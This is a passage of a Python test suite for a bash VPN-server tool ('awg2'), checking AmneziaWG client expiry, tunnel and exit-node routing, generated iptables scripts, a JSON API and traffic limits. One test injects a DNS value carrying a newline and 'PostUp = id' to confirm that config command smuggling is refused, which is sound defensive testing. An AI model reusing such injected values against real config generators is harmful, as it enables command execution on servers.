chk("выходы удалены (в т.ч. «Починить конфиг») — их клиенты на выходе по умолчанию, тег не как регулярка",
    out.split() == ["2", "10.0.0.5", "10.0.0.6|tx1", "10.0.0.7", "10.0.0.8"], out)
with open(XP, "w") as f:
    f.write(xp_saved)
# Заблокированный клиент остаётся в списках туннелей под своим адресом
WP = os.path.join(ROOT, "warp.peers.test")
with open(WP, "w") as f:
    f.write(IP2 + "\n")
rc, out, _ = bash(f'py meta-set "$SERVER_CONF" {C2} expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  f'peers_sync "{WP}"; cat "{WP}"; clients_name_ip | grep "^{C2}|"; py expire-clear "$SERVER_CONF" {C2} "$EXPIRE_SUSPEND_IP" >/dev/null')
chk("заблокированный клиент: в списке туннеля и в clients_name_ip — настоящий адрес", out.split() == [IP2, f"{C2}|{IP2}"], out)
os.remove(WP)
# Удаление заблокированного клиента: его настоящий адрес уходит из туннелей
bash('client_create gina "" none "1.1.1.1, 1.0.0.1" "" >/dev/null 2>&1')
rc, out, _ = bash('had=0; [[ -f "$WARP_PEERS" ]] && had=1 && cp "$WARP_PEERS" "$WARP_PEERS.sv"; '
                  'ip=$(clients_name_ip | awk -F"|" \'$1 == "gina" {print $2}\'); echo "$ip" >> "$WARP_PEERS"; '
                  'py meta-set "$SERVER_CONF" gina expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  'client_delete "$(client_pub gina)" >/dev/null 2>&1; echo "ip=$ip"; grep -c "^$ip\(|\|$\)" "$WARP_PEERS" || true; '
                  'if (( had )); then mv -f "$WARP_PEERS.sv" "$WARP_PEERS"; else rm -f "$WARP_PEERS"; fi')
gip = re.search(r"ip=(\S+)", out)
chk("удалён заблокированный клиент — его настоящий адрес убран из списка туннеля",
    gip and gip.group(1).startswith("10.") and out.strip().splitlines()[-1] == "0", out)
# Чужой тег входа tun («tun» из правленного руками конфига): общее правило
# переставало узнаваться — дописывалось новое, старое вело в прежний выход
XF = os.path.join(TMP, "xf.json")
with open(XF, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun", "settings": {}}],
               "outbounds": [{"protocol": "vless", "tag": "A"}, {"protocol": "vless", "tag": "B"},
                             {"protocol": "freedom", "tag": "direct"}],
               "routing": {"rules": [{"type": "field", "inboundTag": ["tun"], "outboundTag": "A"}]}}, f)
rc, out, _ = bash(f'py xray-prepare "{XF}" native && py xray-main "{XF}" B && py xray-prepare "{XF}" native && py xray-main-get "{XF}"')
xf = json.load(open(XF))
mains = [r for r in xf["routing"]["rules"] if r.get("inboundTag")]
chk("Xray: чужой тег tun — одно общее правило, выход по умолчанию меняется",
    rc == 0 and out.strip() == "B" and len(mains) == 1 and mains[0] == {"type": "field", "inboundTag": ["tun-in"], "outboundTag": "B"}
    and xf["inbounds"][0]["tag"] == "tun-in", [out, xf])
bash("client_remove xc1 >/dev/null 2>&1")

# ── 4. Служебные скрипты ──────────────────────────────────
print("Служебные скрипты")
with open(conf, "w") as f:
    f.write(OLD20)
with open(LINKS, "w") as f:
    f.write("awg0\ntun0\nxray0\nwarp0\nawg-exit-de\nawg-exit-nl\n")
os.makedirs(os.path.join(ROOT, "etc/awg-cascade"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf"), "w") as f:
    f.write("udp|443|5.6.7.8|443|de\ntcp|8443|5.6.7.8|443|\n")
for n in ("de", "nl"):
    open(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf"), "w").close()
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state"), "w") as f:
    f.write("active\nmode=peers\nbalancer=ecmp\nsingle_exit=\n")
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list"), "w") as f:
    f.write("10.23.45.2|nl\n10.23.45.3\n")
os.makedirs(os.path.join(ROOT, "etc/awg-wgobf"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-wgobf/state"), "w") as f:
    f.write("NET=10.77.1.0/24\nWG_PORT=40001\nPORT=40000\n")
with open(os.path.join(TMP, "warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 172.16.0.2/32, 2606::1/128\nMTU = 1280\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")

rc, out, err = bash(f'''
WARP_CONF="{TMP}/warp0.conf"
_dns_emit_helpers && _cascade_persist && _exits_write_unit && expire_install >/dev/null
emit_script "$T2S_ROUTING_SCRIPT" 't2s_routing_run "$@"' T2S_IF T2S_TABLE T2S_ADDR "${{RT_FUNCS[@]}}" t2s_routing_run
_xray_emit_routing
emit_script "$WGOBF_FW" 'wgobf_fw_run "$@"' WGOBF_STATE WGOBF_TAG WGOBF_IF ipt_del_grep ipt_del_tagged wgobf_get wgobf_fw_run
emit_script "$WARP_AUTOSTART_SCRIPT" 'warp_wg_bringup' WARP_CONF WARP_IF WARP_TABLE WARP_PEERS "${{RT_FUNCS[@]}}" warp_wg_bringup
emit_script "$WARP_HEALTH_SCRIPT" 'warp_health_run' WARP_IF WARP_TABLE WARP_STATE WARP_BACKEND_FILE WARP_HEALTH_LOG "${{RT_FUNCS[@]}}" warp_health_run
emit_script "$USQUE_UP_HOOK" 'usque_on_connect' WARP_IF WARP_TABLE WARP_PEERS USQUE_LOG "${{RT_FUNCS[@]}}" usque_on_connect
ls "{ROOT}/scripts"''')
scripts = out.split()
chk("скрипты сгенерированы", rc == 0 and len(scripts) == 11, err + out)
for s in scripts:
    r = subprocess.run(["bash", "-n", os.path.join(ROOT, "scripts", s)], capture_output=True, text=True)
    chk(f"bash -n {s}", r.returncode == 0, r.stderr)

SCR = lambda n: os.path.join(ROOT, "scripts", n)
NOT_FOUND = re.compile(r"command not found|unbound variable")


def run_and_check(label, script, *args, must=(), must_not=()):
    reset_calls()
    rc, out, err = run_script(SCR(script), *args)
    log = calls()
    missing = [m for m in must if not re.search(m, log)]
    present = [m for m in must_not if re.search(m, log)]
    chk(label, not NOT_FOUND.search(err) and not missing and not present,
        f"rc={rc} err={err.strip()[-300:]} нет: {missing} лишнее: {present}")


run_and_check("DNS: перехват и блок DoT в mangle", "DNS_PERSIST_SCRIPT",
              must=[r"-t nat -A PREROUTING -i awg0 -p udp --dport 53 -j DNAT --to-destination 127\.0\.2\.1:53 -m comment --comment awg2-dns",
                    r"-t mangle -A PREROUTING -i awg0 -p tcp --dport 853 -j DROP -m comment --comment awg2-dns",
                    r"-t filter -I INPUT 1 -i awg0 -d 127\.0\.2\.1"])
run_and_check("DNS: health-check", "DNS_HEALTH_SCRIPT", must=[r"-t nat -A PREROUTING"])
run_and_check("Каскад: только адреса сервера, туда и обратно", "CASCADE_SCRIPT",
              must=[r"-t nat -A PREROUTING -p udp --dport 443 -m addrtype --dst-type LOCAL -j DNAT --to-destination 5\.6\.7\.8:443 -m comment --comment awg-cascade:udp-443",
                    r"-I FORWARD 1 -p tcp -s 5\.6\.7\.8 --sport 443 -j ACCEPT -m comment --comment awg-cascade:tcp-8443"])
run_and_check("tun2socks: вся подсеть в таблицу 100", "T2S_ROUTING_SCRIPT", "start",
              must=[r"ip rule add from 10\.23\.45\.0/24 lookup 100 priority 100", r"MASQUERADE -m comment --comment awg2-tun-tun0"])
os.makedirs(os.path.join(ROOT, "etc/xray"), exist_ok=True)
with open(os.path.join(ROOT, "etc/xray/state"), "w") as f:
    f.write("active\ntun_mode=tun2socks\n")
run_and_check("Xray: клиенты из списка в таблицу 201", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip route replace default dev xray0 table 201", r"-A POSTROUTING .* -o xray0 -j MASQUERADE"])
with open(os.path.join(ROOT, "etc/xray/state"), "w") as f:
    f.write("active\ntun_mode=native\n")
run_and_check("Xray с inbound tun: без NAT — Xray видит адрес клиента", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip route replace default dev xray0 table 201", r"-D POSTROUTING .* -o xray0 -j MASQUERADE"],
              must_not=[r"-A POSTROUTING .* -o xray0 -j MASQUERADE"])
os.remove(os.path.join(ROOT, "etc/xray/state"))
run_and_check("Exit-ноды: ECMP и персональная нода", "EXITS_SCRIPT", "start",
              must=[r"nexthop dev awg-exit-de weight 1 nexthop dev awg-exit-nl weight 1",
                    r"ip route replace default dev awg-exit-nl table 211",
                    r"ip rule add from 10\.23\.45\.2 lookup 211 priority 202",
                    r"ip rule add from 10\.23\.45\.3 lookup 202 priority 202"])
run_and_check("Exit-ноды: остановка", "EXITS_SCRIPT", "stop", must_not=[r"-A "])
run_and_check("WG+обфускатор: правила по метке", "WGOBF_FW", "up",
              must=[r"-I INPUT 1 -p udp --dport 40001 ! -i lo -j DROP -m comment --comment awg-wgobf",
                    r"-t nat -A POSTROUTING -s 10\.77\.1\.0/24 ! -o wgobf0 -j MASQUERADE"])
run_and_check("usque on-connect", "USQUE_UP_HOOK", must=[r"table 200"])
run_and_check("Сроки клиентов", "EXPIRE_BIN", must=[r"awg-quick strip awg0"])
with open(conf) as f:
    chk("истёкший клиент заблокирован скриптом таймера", "AllowedIPs = 127.0.0.2/32" in f.read())
with open(LINKS, "w") as f:
    f.write("awg0\n")
run_and_check("WARP: подъём warp0 только с IPv4", "WARP_AUTOSTART_SCRIPT",
              must=[r"ip link add dev warp0 type wireguard", r"ip -4 addr add 172\.16\.0\.2/32 dev warp0",
                    r"ip route replace default dev warp0 src 172\.16\.0\.2 table 200"],
              must_not=[r"2606::1"])

# ── 5. Разбор iptables-save ───────────────────────────────
print("iptables-save")
with open(IPT_SAVE, "w") as f:
    f.write('-A PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment "awg-cascade:udp-443" -j DNAT --to-destination 5.6.7.8:443\n'
            '-A PREROUTING -p udp -m udp --dport 4430 -m comment --comment "awg-cascade:udp-4430" -j DNAT --to-destination 5.6.7.8:4430\n'
            '-A POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE\n')
reset_calls()
bash("cascade_unapply udp 443")
log = calls()
chk("правило с комментарием в кавычках удаляется, соседнее — нет",
    "-D PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment awg-cascade:udp-443 -j DNAT" in log
    and "4430" not in log, log)
reset_calls()
bash("rt_fw_down tun0")
chk("метка туннеля", "-t nat -D POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE" in calls(), calls())

# ── 6. CLI без root ───────────────────────────────────────
print("CLI")
r = subprocess.run(["bash", AWG2, "--version"], capture_output=True, text=True)
chk("--version", r.returncode == 0 and r.stdout.startswith("awg2 v"), r.stdout + r.stderr)
r = subprocess.run(["bash", AWG2, "--help"], capture_output=True, text=True)
chk("--help", r.returncode == 0 and "--tunnel" in r.stdout and "--wgobf" in r.stdout, r.stderr)
head = open(AWG2, encoding="utf-8").read(4096)
chk("VERSION в первых 4 КБ (самообновление и бот)", re.search(r'^VERSION="v\d+\.\d+\.\d+"$', head, re.M) is not None)

# ── 7. Машинный API (awg2 api) ────────────────────────────
print("API")
API_WRAP = api_wrapper()
with open(conf, "w") as f:
    f.write(OLD20)
for n in ("alice", "bob"):
    with open(os.path.join(ROOT, "root", n + "_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\n")


def api(*args, stdin=None, env=None):
    # stdin — открытый пайп: API обязан не ждать его без нужды
    r = subprocess.run([API_WRAP, *args], input=stdin, capture_output=True, text=True,
                       env=dict(ENV, **(env or {})), timeout=120)
    lines = r.stdout.strip().splitlines()
    try:
        res = json.loads(lines[-1]) if len(lines) == 1 else {"raw": r.stdout}
    except ValueError:
        res = {"raw": r.stdout}
    res["_rc"] = r.returncode
    res["_err"] = r.stderr
    return res


r = api("version")
chk("api version — одна строка JSON", r.get("ok") is True and r["data"]["version"].startswith("v")
    and r["data"]["api"] == 1, r)
SLOW = os.path.join(TMP, "slowbin")
os.makedirs(SLOW)
with open(os.path.join(SLOW, "curl"), "w") as f:
    f.write("#!/usr/bin/env bash\nsleep 6\nexit 1\n")
os.chmod(os.path.join(SLOW, "curl"), 0o755)
t0 = time.time()
r = api("status", env={"PATH": SLOW + ":" + ENV["PATH"]})
chk("фоновая проверка обновлений не держит ответ", r.get("ok") and time.time() - t0 < 5, time.time() - t0)
d = r.get("data") or {}
chk("api status", r.get("ok") and d["server"]["exists"] and d["server"]["clients"] == 2
    and d["server"]["proto"] == "2.0" and d["tunnels"]["warp"] == "none", r)
r = api("clients", "list")
rows = r.get("data") or []
chk("api clients list", [c["name"] for c in rows] == ["alice", "bob"] and rows[0]["ip"] == "10.23.45.2"
    and rows[0]["file"].endswith("alice_awg2.conf") and rows[1]["expires"] == 1 and rows[0]["warp"] is None, r)
r = api("client", "add", "carol", "expire=+1d", "mimicry=none")
d = r.get("data") or {}
chk("api client add", r.get("ok") and d.get("name") == "carol" and "[Interface]" in d.get("text", ""), r)
r = api("client", "add", "carol", "mimicry=none")
chk("занятое имя — ошибка с текстом", r.get("ok") is False and r["rc"] == 1 and "carol" in r["error"], r)
r = api("client", "add", "dnsbad", "mimicry=none", "dns=1.1.1.1\nPostUp = id")
chk("api client add: DNS с переводом строки — отказ, конфиг не создан",
    r.get("ok") is False and "dns" in r.get("error", "")
    and not os.path.exists(os.path.join(ROOT, "root", "dnsbad_awg2.conf")), r)
rows = api("clients", "list").get("data") or []
carol = next((c for c in rows if c["name"] == "carol"), {})
chk("срок клиента", carol.get("expires", 0) > 1e9 and carol.get("mimicry") == "none", carol)
r = api("client", "rename", "carol", "dave")
chk("api client rename", r.get("ok") and os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("client", "del", "dave")
chk("api client del", r.get("ok") and not os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("clients", "bulk", "t:3", "mimicry=none")
chk("api clients bulk", r.get("ok") and r["data"] == ["t-001", "t-002", "t-003"], r)
api("clients", "bulk", "z:2", "mimicry=none")
r = api("clients", "bulk", "past:2", "expire=2020-01-01", "mimicry=none")
chk("bulk: срок в прошлом отвергается", r.get("ok") is False and "прошёл" in (r.get("error") or "")
    and not any(c["name"].startswith("past-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "z-001, z-002,nobody")
chk("api clients del — несколько, неизвестные пропускаются",
    r.get("ok") and r["data"] == ["z-001", "z-002"] and "Нет клиента: nobody" in r.get("log", "")
    and not os.path.exists(os.path.join(ROOT, "root", "z-001_awg2.conf"))
    and not any(c["name"].startswith("z-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "nobody")
chk("api clients del — никого не нашёл: ошибка", not r.get("ok") and r.get("data") == [], r)
r = api("tunnels", "clients", "warp")
chk("клиенты туннеля без списка — все", r.get("ok") and len(r["data"]) == 5 and all(c["on"] for c in r["data"]), r)
api("tunnels", "client", "warp", "none")
r = api("tunnels", "client", "warp", "alice", "on")
rows = api("tunnels", "clients", "warp").get("data") or []
chk("выбор клиентов туннеля", [c["name"] for c in rows if c["on"]] == ["alice"], rows)
r = api("mimicry")
chk("api mimicry", r.get("ok") and len(r["data"]) == 9 and r["data"][0]["id"] == "quic" and r["data"][0]["domain"], r)
r = api("cascade", "add", "udp", "4443", "5.6.7.8", "443", "тест")
rule = next((x for x in api("cascade", "list").get("data") or [] if x["in"] == 4443), {})
chk("api cascade add/list", r.get("ok") and rule.get("out") == 443 and rule.get("proto") == "udp"
    and rule.get("comment") == "тест", [r, rule])
r = api("exits", "add", "n1", stdin="")
chk("stdin обязателен для exits add", r.get("ok") is False and "stdin" in r["error"], r)
r = api("exits", "add", "n1", stdin="[Interface]\nPrivateKey = X\n")
chk("конфиг ноды читается из stdin", r.get("ok") is False and "Endpoint" in r["error"], r)
# Exit-ноды: все клиенты / никто одной командой, режим без включения
EX_PEERS, EX_STATE = os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list"), os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state")
saved = [open(EX_PEERS).read(), open(EX_STATE).read()]
ips = {c["name"]: c["ip"] for c in api("clients", "list").get("data") or []}
peers = lambda: [x for x in open(EX_PEERS).read().split("\n") if x]
r = api("exits", "client", "none")
chk("exits client none — никого через ноды, режим «выбранные»", r.get("ok") and peers() == [] and "mode=peers" in open(EX_STATE).read(), [r, peers()])
api("exits", "client", "alice", "nl")
r = api("exits", "client", "all")
chk("exits client all — все клиенты, своя нода остаётся", r.get("ok") and len(peers()) == len(ips) and f"{ips['alice']}|nl" in peers(), [r, peers()])
rows = {c["name"]: c.get("exit") for c in api("clients", "list").get("data") or []}
chk("в списке клиентов — выход каждого", rows.get("alice") == "nl" and all(v == "shared" for n, v in rows.items() if n != "alice"), rows)
r = api("exits", "mode", "all")
chk("exits mode all — режим меняется", r.get("ok") and "mode=all" in open(EX_STATE).read(), r)
r = api("exits", "mode", "x")
chk("exits mode — только all|peers", r.get("ok") is False, r)
# «никто» → «все» → «alice напрямую»: список был пуст, и мимо нод уходили все
api("exits", "client", "none")
api("exits", "mode", "all")
r = api("exits", "client", "alice", "off")
chk("из «все клиенты» в «выбранные»: напрямую только alice, остальные через ноды",
    r.get("ok") and sorted(peers()) == sorted(ip for n, ip in ips.items() if n != "alice") and "mode=peers" in open(EX_STATE).read(),
    [r, peers()])
# Клиент «all»: «exits client all off» — про него, а не про всех
api("client", "add", "all", "mimicry=none")
api("exits", "client", "all")
ip_all = next(c["ip"] for c in api("clients", "list").get("data") or [] if c["name"] == "all")
r = api("exits", "client", "all", "off")
chk("клиент по имени all: со вторым аргументом — только он", r.get("ok") and ip_all not in peers() and len(peers()) == len(ips), [r, peers()])
# Туннели: то же — «tunnels client xray all off» про клиента «all»
api("tunnels", "client", "warp", "all")
r = api("tunnels", "client", "warp", "all", "off")
wl = api("tunnels", "clients", "warp").get("data") or []
chk("туннель: клиент по имени all с off — выключен только он",
    r.get("ok") and [c["name"] for c in wl if not c["on"]] == ["all"], [r, wl])
r = api("tunnels", "client", "warp", "none")
wl = api("tunnels", "clients", "warp").get("data") or []
chk("туннель: none без аргумента — все напрямую", r.get("ok") and not any(c["on"] for c in wl), wl)
api("client", "del", "all")
# Кнопка «выбранные» после «никто» и «все»: пустой список увёл бы мимо нод всех
api("exits", "client", "none")
api("exits", "mode", "all")
r = api("exits", "mode", "peers")
chk("exits mode peers после «никто» и «все» — через ноды все, а не никто",
    r.get("ok") and len(peers()) == len(ips), [r, peers()])
# …а сознательный выбор переживает «все» → «выбранные»
api("exits", "client", "none")
api("exits", "client", "bob", "shared")
api("exits", "mode", "all")
api("exits", "mode", "peers")
chk("exits mode peers возвращает прежний выбор", peers() == [ips["bob"]], peers())
with open(EX_PEERS, "w") as f:
    f.write(saved[0])
with open(EX_STATE, "w") as f:
    f.write(saved[1])
# cascade del: аргументы шли в grep -E как регулярка — «.*» вычищал весь файл правил
r = api("cascade", "del", ".*", ".*")
rules = api("cascade", "list").get("data") or []
chk("api cascade del отвергает не порт", r.get("ok") is False and any(x["in"] == 4443 for x in rules), [r, rules])
# Новый срок заблокированному клиенту возвращает адрес, а не оставляет его на 127.0.0.2
api("client", "add", "erin", "mimicry=none")
rc, out, _ = bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  'client_expire_set erin $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^erin"')
cols = out.strip().split("\t")
chk("срок заблокированному снимает блокировку", len(cols) >= 5 and cols[2].startswith("10.23.45.") and cols[4] == ""
    and cols[3].isdigit() and int(cols[3]) > 1e9, repr(out))
api("client", "del", "erin")

# ── Трафик по дням и лимиты (v1.2.0) ──
def dump_with(counters):
    pubs = {c["name"]: c["pub"] for c in api("clients", "list").get("data") or []}
    with open(AWG_DUMP, "w") as f:
        f.write("priv\tpub\t51820\toff\n")
        for n, (rx, tx) in counters.items():
            f.write(f"{pubs[n]}\t(none)\t1.2.3.4:5\t10.0.0.0/32\t0\t{rx}\t{tx}\t25\n")

def tick():
    return bash("traffic_tick 1; cat \"$TRAFFIC_DB\"")[1]

def cl(name):
    return next((c for c in api("clients", "list").get("data") or [] if c["name"] == name), {})

# Первый проход по новой базе только запоминает счётчики: накопленное до
# учёта к сегодняшнему дню не относится
bash('rm -f "$TRAFFIC_DB"')
dump_with({"alice": (1000, 2000), "bob": (10, 10)})
tick()
dump_with({"alice": (1000 + 3 * 2**20, 2000 + 2 * 2**20), "bob": (10, 10)})
db = json.loads(tick().strip().splitlines()[-1])
day = time.strftime("%Y-%m-%d")
a = cl("alice")
chk("трафик: первый проход только запоминает, второй — прирост за день",
    sum(next(iter(db["days"].values())).get(a.get("pub"), [0, 0])) == 5 * 2**20 and day in db["days"]
    and a.get("month") == 5 * 2**20 and a.get("today") == 5 * 2**20 and a.get("limit") is None, [db, a])
dump_with({"alice": (100, 100), "bob": (10, 10)})
tick()
chk("трафик: счётчик меньше прежнего (awg0 перезапущен) — отсчёт с нуля", cl("alice").get("month") == 5 * 2**20 + 200,
    cl("alice"))
r = api("client", "limit", "alice", "1M")
a = cl("alice")
chk("лимит меньше израсходованного — сразу блок", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
    and a.get("limit") == 2**20 and a.get("period") == "month" and a.get("used", 0) >= 2**20, [r, a])
rc, out, _ = bash('clients_tsv | grep "^alice"')
chk("блок за трафик: адрес в orig_ips, метка blocked_by", "127.0.0.2/32" in out and out.rstrip("\n").endswith("\ttraffic"),
    repr(out))
rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
chk("новый срок блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
r = api("client", "limit", "alice", "10G")
a = cl("alice")
chk("лимит выше израсходованного — разблокировка", r.get("ok") and not a.get("blocked") and a.get("ip") == "10.23.45.2"
    and a.get("limit") == 10 * 2**30, [r, a])
r = api("traffic", "daily")
d = r.get("data") or {}
chk("api traffic daily — сервер за 30 дней с разбивкой по клиентам", r.get("ok") and len(d.get("days", [])) == 30
    and d["days"][-1] == day and d.get("total") == 5 * 2**20 + 200 and d["clients"][0]["name"] == "alice", r)
r = api("traffic", "daily", "alice", "7")
chk("api traffic daily ИМЯ ДНЕЙ", r.get("ok") and len(r["data"]["days"]) == 7 and r["data"]["name"] == "alice"
    and "clients" not in r["data"], r)
r = api("traffic", "daily", "nobody")
chk("api traffic daily — нет клиента", r.get("ok") is False, r)
db_before = bash('cat "$TRAFFIC_DB" 2>/dev/null')[1]
r = api("traffic", "now")
d = r.get("data") or {}
chk("api traffic now — счётчики клиентов по именам и время для живой скорости",
    r.get("ok") and isinstance(d.get("ts"), (int, float)) and d.get("ts") > 1e9
    and isinstance((d.get("peers") or {}).get("alice"), list) and len(d["peers"]["alice"]) == 2, r)
db_after = bash('cat "$TRAFFIC_DB" 2>/dev/null')[1]
chk("api traffic now — база трафика не пишется", db_before == db_after)
r = api("client", "limit", "alice", "2G", "total")
chk("лимит «всего» считается с этой минуты", r.get("ok") and cl("alice").get("used") == 0
    and cl("alice").get("period") == "total", cl("alice"))
dump_with({"alice": (100 + 2**20, 100), "bob": (10, 10)})
tick()
api("client", "limit", "alice", "1M", "month")
r = api("client", "limit-reset", "alice")
a = cl("alice")
chk("обнулить счётчик лимита — разблокировка до конца месяца", r.get("ok") and a.get("used") == 0 and not a.get("blocked"), a)
r = api("client", "limit", "alice", "много")
chk("лимит: размер не распознан", r.get("ok") is False and "распознан" in (r.get("error") or ""), r)
r = api("client", "limit", "alice", "5G", "week")
chk("лимит: неизвестный период", r.get("ok") is False, r)
r = api("client", "limit-reset", "bob")
chk("обнулить без лимита — ошибка", r.get("ok") is False, r)
# Истёк и срок: пока лимит исчерпан, блок держит он; отпустил лимит — блок
# переходит к сроку, и снимается уже сроком
api("client", "limit", "alice", "1K")
dump_with({"alice": (100 + 2**20 + 4096, 100), "bob": (10, 10)})
tick()
chk("превысил лимит по ходу — блок таймером", cl("alice").get("blocked_by") == "traffic", cl("alice"))
bash('py meta-set "$SERVER_CONF" alice expires 1')
tick()
a = cl("alice")
chk("истёк срок у заблокированного за трафик — блок держит лимит", a.get("blocked") and a.get("blocked_by") == "traffic", a)
r = api("client", "unexpire", "alice")
a = cl("alice")
chk("снять срок не снимает блок за трафик", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
    and a.get("expires") is None and "лимит трафика" in r.get("log", ""), [r, a])
rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
chk("новый срок после истёкшего блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
bash('py meta-set "$SERVER_CONF" alice expires 1')
# «Истёкшие» удаляют только заблокированных сроком
api("client", "add", "erin", "mimicry=none")
bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null')
# bob (истёк в начале раздела) нужен дальше — снимаем с него срок, чтобы purge его не тронул
bash('py expire-clear "$SERVER_CONF" bob "$EXPIRE_SUSPEND_IP" >/dev/null')
r = api("clients", "purge-blocked")
names = [c["name"] for c in api("clients", "list").get("data") or []]
chk("purge-blocked: истёкший удалён, заблокированный за трафик остался", r.get("ok") and "erin" not in names
    and "alice" in names, [r, names])
api("client", "limit", "alice", "off")
a = cl("alice")
chk("снятие лимита у истёкшего — блок переходит к сроку", a.get("blocked") and a.get("blocked_by") == "expire"
    and a.get("limit") is None, a)
api("client", "unexpire", "alice")
chk("снять срок — разблокировка", not cl("alice").get("blocked"), cl("alice"))
# Лимит по новой базе (база потеряна): трафик до этой минуты в лимит не идёт
bash('rm -f "$TRAFFIC_DB"')
dump_with({"alice": (50 * 2**20, 50 * 2**20)})
r = api("client", "limit", "alice", "10M")
a = cl("alice")
chk("лимит по новой базе: накопленное до учёта не считается", r.get("ok") and not a.get("blocked")
    and a.get("used") == 0, [r, a])
dump_with({"alice": (50 * 2**20 + 1000, 50 * 2**20)})
tick()
chk("лимит по новой базе: дальше — только прирост", cl("alice").get("used") == 1000, cl("alice"))
api("client", "limit", "alice", "off")
# Пустой снимок (awg0 лежит) не снимает «первый проход»
bash('rm -f "$TRAFFIC_DB"')
dump_with({})
tick()
dump_with({"alice": (7 * 2**20, 7 * 2**20)})
tick()
chk("пустой снимок: накопленное до учёта не идёт в сегодня", cl("alice").get("today") == 0, cl("alice"))
rc, out, _ = bash('ls "$EXPIRE_STATE_DIR" | grep "^transfer"')
chk("снимки счётчиков не остаются — только последний, для сторожа таймера", out.split() == ["transfer"], out)
# Размер лимита: «500B» — не 500 ГБ; переполнение и не-ASCII цифры — ошибка
rc, out, _ = bash('for v in 500B 500iB 2000000T 9999999T "١٢G" 0.0001K; do py size-parse "$v" >/dev/null 2>&1 && echo "$v"; done; '
                  'for v in 500MB 1.5T 50 2GiB 1024T; do py size-parse "$v" >/dev/null 2>&1 || echo "!$v"; done')
chk("размер лимита: B без единицы, > 1 ПБ, не-ASCII — отказ", out.strip() == "", repr(out))
# traffic daily: имя клиента из цифр — это имя, а не число дней
api("client", "add", "2024", "mimicry=none")
r = api("traffic", "daily", "2024", "7")
chk("api traffic daily ИМЯ-ЧИСЛО ДНЕЙ", r.get("ok") and r["data"]["name"] == "2024" and len(r["data"]["days"]) == 7
    and "clients" not in r["data"], r)
r = api("traffic", "daily", "all", "7")
chk("api traffic daily all ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 7, r)
r = api("traffic", "daily", "14")
chk("api traffic daily ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 14, r)
api("client", "del", "2024")
# Таймер ждёт замок API: конфиг не правится одновременно с вызовом из бота
api("client", "add", "frank", "mimicry=none")
rc, out, _ = bash('mkdir -p "$STATE_DIR"; exec 7>>"$STATE_DIR/api.lock"; flock 7; '
                  'py meta-set "$SERVER_CONF" frank expires 1; touch -d "-10 min" "$EXPIRE_STATE_DIR/transfer"; '
                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
                  'echo "age=$(( $(date +%s) - $(stat -c %Y "$EXPIRE_STATE_DIR/transfer") ))"')
chk("таймер: замок API занят — проход пропущен, но сторож видит, что таймер жив",
    "\t127.0.0.2/32\t" not in out and int(re.search(r"age=(-?\d+)", out).group(1)) < 60, repr(out))
# Долгая задача API: замок занят дольше EXPIRE_LOCK_MAX — проход идёт без него
rc, out, _ = bash('exec 7>>"$STATE_DIR/api.lock"; flock 7; touch -d "-5 min" "$EXPIRE_STATE_DIR/lock_busy"; '
                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
                  '[[ -f "$EXPIRE_STATE_DIR/lock_busy" ]] && echo BUSY-MARK')
chk("таймер: замок занят дольше 2 минут — сроки не ждут, проход идёт", "\t127.0.0.2/32\t" in out, repr(out))
bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; rm -f "$EXPIRE_STATE_DIR/lock_busy"; '
     'py meta-set "$SERVER_CONF" frank expires 1')
# Сообщения в Telegram — после замка: иначе медленный Telegram держал бы замок API
with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\n')
SENT = os.path.join(TMP, "notify-lock")
